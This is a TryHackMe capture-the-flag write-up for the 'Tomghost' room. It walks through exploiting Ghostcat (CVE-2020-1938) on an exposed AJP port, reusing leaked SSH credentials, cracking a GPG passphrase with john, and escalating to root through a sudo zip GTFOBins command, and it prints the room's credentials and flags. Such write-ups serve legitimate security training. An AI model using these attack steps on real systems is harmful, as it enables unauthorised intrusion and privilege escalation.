# 🛡️ TryHackMe – Tomghost - Writeup

## 📌 Overview
**Room Name:** Tomghost  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Apache Tomcat / AJP Protocol / GPG Cracking / Privilege Escalation

This machine walks through a multi-stage exploitation path starting from an exposed AJP port, leveraging the Ghostcat vulnerability (CVE-2020-1938) to gain initial access, followed by offline GPG key cracking for lateral movement, and finally escalating privileges through a misconfigured `zip` binary in the sudoers file.

The attack chain involves:

- AJP port 8009 discovery and Ghostcat (CVE-2020-1938) exploitation
- `web.xml` read to extract hardcoded SSH credentials
- GPG private key and encrypted file discovery
- gpg2john and john to crack the GPG passphrase for lateral movement to `merlin`
- sudo `zip` exploitation via GTFOBins for root access

---

## 🔍 1. Enumeration

### 🔎 Port Scanning

```bash
rustscan -a <target_ip> -- -sV
```

Key findings:

```text
22/tcp   open  ssh
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat
```

Port **8009 (AJP)** is not typically exposed externally — a strong indicator of misconfiguration. Searched for known vulnerabilities:

```bash
searchsploit tomcat ajp
```

Returned **Ghostcat (CVE-2020-1938)** — allows arbitrary file read from the Tomcat server via the AJP service.

---

## 🔓 2. Initial Access

### 💀 Ghostcat (CVE-2020-1938) Exploitation
Used the public Ghostcat exploit (modified for Python 3):

```bash
python3 48143.py <target_ip>
```

Successfully retrieved `WEB-INF/web.xml`, which contained hardcoded credentials:

```
Username: skyfuck
Password: 8730281lkjlkjdqlksalks
```

Logged in via SSH:

```bash
ssh skyfuck@<target_ip>
```

**Initial access as `skyfuck` achieved.** ✅

---

## 🚀 3. Lateral Movement: skyfuck → merlin

### 🔑 GPG Key Cracking
`skyfuck` had no sudo privileges. Home directory contained:

- `tryhackme.asc` — GPG private key
- `credential.pgp` — encrypted file

Exported the key hash and cracked the passphrase offline:

```bash
gpg2john tryhackme.asc > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# Passphrase: alexandru
```

Imported the key and decrypted the PGP file:

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

Revealed credentials for `merlin`:

```
Username: merlin
Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

```bash
su merlin
```

**Lateral movement to `merlin` achieved.** ✅

---

## 👑 4. Privilege Escalation: merlin → root

### ⚠️ Sudo Misconfiguration — zip GTFOBins
Checked sudo permissions as `merlin`:

```bash
sudo -l
```

```text
(root : root) NOPASSWD: /usr/bin/zip
```

According to GTFOBins, `zip` can execute arbitrary commands using the `-T` and `-TT` flags:

```bash
sudo zip /tmp/pwn.zip /etc/hosts -T -TT '/bin/sh #'
```

```bash
whoami
# root
```

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
THM{GhostCat_1s_so_cr4sy}
```

### 👑 Root Flag

```
THM{Z1P_1S_FAKE}
```

---

## 📚 Key Takeaways

- 🌐 **Unusual open ports lead to unusual vulnerabilities:** AJP on port 8009 is rarely exposed externally. Any unexpected open port warrants immediate investigation.
- 🔐 **Offline cracking is silent and powerful:** Exporting and cracking the GPG key locally avoids triggering alarms and enables lateral movement with minimal noise.
- 🛠️ **Every sudo binary is a potential risk:** `zip` looks benign but enables shell execution via the `-TT` flag. Always cross-reference sudo binaries against GTFOBins before granting permissions.

---

## 🛠️ Tools Used

- `rustscan`
- `searchsploit`
- `gpg2john`, `john`
- `gpg`
- `ssh`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
